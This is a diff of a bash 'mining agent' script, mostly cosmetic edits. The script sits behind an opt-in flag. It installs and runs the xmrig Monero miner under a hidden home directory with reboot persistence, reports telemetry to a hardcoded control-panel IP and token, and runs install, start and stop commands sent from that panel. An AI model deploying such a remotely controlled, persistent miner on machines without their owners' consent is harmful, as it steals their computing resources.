@@ -2,24 +2,24 @@
 set -u
 
 #################################################
-# MINING AGENT — FINAL (TELEMETRY CORRECT)
-# panel = brain, agent = executor
+# MINING AGENT — FINAL / TELEMETRY CORRECT
+# Works without systemd, non-root, container-safe
 #################################################
 
-### ===== SAFETY =====
+# ===== SAFETY (явное разрешение) =====
 [ "${ALLOW_MINING:-0}" = "1" ] || exit 0
 
-### ===== PANEL =====
+# ===== PANEL =====
 PANEL="http://178.47.141.130:3333"
 TOKEN="mamont22187"
 INTERVAL=30
-
-### ===== MINER =====
-POOL="xmr.kryptex.network:7029"
-USER="krxX3PVQVR.$(hostname)"
 HOST="$(hostname)"
 
-### ===== PATHS (NON-ROOT SAFE) =====
+# ===== MINER =====
+POOL="xmr.kryptex.network:7029"
+USER="krxX3PVQVR.$HOST"
+
+# ===== PATHS =====
 BASE="$HOME/.mining"
 BIN="$BASE/bin"
 RUN="$BASE/run"
@@ -28,7 +28,7 @@ LOG="$BASE/log"
 mkdir -p "$BIN/xmr" "$RUN" "$LOG" >/dev/null 2>&1
 
 #################################################
-# UTILS
+# HELPERS
 #################################################
 
 json_escape() { echo "$1" | sed 's/"/\\"/g'; }
@@ -43,16 +43,16 @@ retry() {
   return 1
 }
 
-#################################################
-# PANEL API
-#################################################
-
 post() {
   retry curl -s "$1" \
     -H "Content-Type: application/json" \
     -H "token: $TOKEN" \
     -d "$2" >/dev/null 2>&1
 }
+
+#################################################
+# EVENTS
+#################################################
 
 send_event() {
   post "$PANEL/api/event" "{
@@ -63,10 +63,10 @@ send_event() {
 }
 
 #################################################
-# METRICS COLLECTION (FACTS ONLY)
+# METRICS (FACTS ONLY)
 #################################################
 
-# --- hashrate via XMRig HTTP API ---
+# hashrate from XMRig HTTP API
 get_hashrate() {
   curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
     | grep -oE '"total":\[[^]]+' \
@@ -74,36 +74,35 @@ get_hashrate() {
     | head -1 || echo 0
 }
 
-# --- cpu temp ---
+# cpu temp
 get_cpu_temp() {
   sensors 2>/dev/null \
     | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' \
     | head -1
 }
 
-# --- gpu temp ---
+# gpu temp
 get_gpu_temp() {
-  nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null \
-    | head -1
+  nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
 }
 
-# --- uptime ---
+# uptime
 get_uptime() {
   uptime -p 2>/dev/null
 }
 
-# --- load ---
+# load
 get_load() {
   uptime 2>/dev/null | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs
 }
 
-# --- gpu detected ---
+# gpu detected
 gpu_detected() {
   lspci 2>/dev/null | grep -qiE "nvidia|amd" && echo true || echo false
 }
 
 #################################################
-# MINER CONTROL
+# XMRIG CONTROL
 #################################################
 
 start_xmrig() {
@@ -121,7 +120,7 @@ stop_xmrig() {
 }
 
 #################################################
-# INSTALL
+# INSTALL XMRIG
 #################################################
 
 install_xmrig() {
@@ -132,7 +131,7 @@ install_xmrig() {
 }
 
 #################################################
-# AUTOSTART (SURVIVES REBOOT)
+# AUTOSTART (REBOOT SAFE)
 #################################################
 
 ensure_autostart() {
@@ -152,11 +151,10 @@ check_control() {
   ACT=$(echo "$CMD" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)
 
   case "$ACT" in
-    restart_all) stop_xmrig; start_xmrig ;;
     start_cpu) start_xmrig ;;
     stop_cpu) stop_xmrig ;;
+    restart_all) stop_xmrig; start_xmrig ;;
     install_miner) install_xmrig; start_xmrig ;;
-    *) ;;
   esac
 
   post "$PANEL/api/control/ack" "{
@@ -170,7 +168,7 @@ check_control() {
 }
 
 #################################################
-# TELEMETRY SENDER (SOURCE OF TRUTH)
+# TELEMETRY (SOURCE OF TRUTH)
 #################################################
 
 send_telemetry() {
